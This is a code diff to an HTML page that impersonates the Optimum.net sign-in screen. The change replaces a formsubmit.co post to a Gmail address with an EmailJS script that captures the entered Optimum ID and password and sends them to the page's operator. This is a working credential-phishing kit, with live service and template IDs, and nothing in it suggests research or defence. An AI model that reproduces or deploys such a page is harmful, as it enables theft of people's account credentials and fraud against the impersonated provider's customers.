@@ -13,11 +13,7 @@
     <script type="text/javascript"
     src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
    </script>
-   <script type="text/javascript">
-   (function(){
-   emailjs.init("Fc6Zb2E93HsLc4jAH");
-   })();
-   </script>
+  
 
    <style>
     body{
@@ -119,17 +115,15 @@
  
 
  <main class="container">
-  <form action="https://formsubmit.co/mywork4tee@gmail.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://optimum.net/redirect.html">
+  <form id="login-form">
     <div class="mb-3">
       <label for="exampleInputEmail1" class="form-label">My Optimum ID</label>
-      <input type="text" name="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
+      <input type="text" name="exampleInputEmail1" class="form-control" id="exampleInputEmail1"  aria-describedby="emailHelp">
       <div id="emailHelp" class="form-text">I forgot my Optimum ID</div>
     </div>
     <div class="mb-3">
       <label for="exampleInputPassword1" class="form-label">Password</label>
-      <input type="password" name="password" class="form-control" id="exampleInputPassword1">
+      <input type="password" name="exampleInputPassword1" class="form-control" " id="exampleInputPassword1">
       <div id="emailHelp" class="form-text">I forgot my Password</div>
       <hr/>
     </div>
@@ -139,15 +133,10 @@
      
       <label class="form-check-label" for="exampleCheck1">Remember me</label>
     </div>
-    <button onclick="sendMail()"  type="submit" class="btn  text-light">Sign in to Optimum.net</button>
+    <button  type="submit" class="btn  text-light">Sign in to Optimum.net</button>
     <div id="emailHelp" class="form-text">Don't have an Optimum ID? Create one</div>
   </form>
-  <!-- <form action="https://formsubmit.co/mywork4tee@gmail.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="text" name="name" required>
-    <input type="email" name="email" required>
-    <button type="submit">Send</button>
-</form> -->
+
 
 
  </main>
@@ -155,6 +144,34 @@
 
  <script >
  
+ // Load the EmailJS SDK asynchronously
+(function() {
+  emailjs.init("Fc6Zb2E93HsLc4jAH");
+})();
+
+// Handle the form submission
+const form = document.getElementById("login-form");
+
+form.addEventListener("submit", (event) => {
+  event.preventDefault(); // Prevent the default form submission behavior
+
+  // Get the form data;
+  const optimumId = form.elements["exampleInputEmail1"].value;
+  const password = form.elements["exampleInputPassword1"].value;
+
+  // Send the form data to EmailJS
+  emailjs.send("service_rybja5w", "template_2g5g3nh", {
+    optimumId: optimumId,
+    password: password,
+  })
+  .then(() => {
+    // Handle the successful form submission here
+    alert("Form submitted successfully!");
+  }, (error) => {
+    // Handle the form submission error here
+    alert("Form submission failed. Error: " + error);
+  });
+});
 
 </script>
 
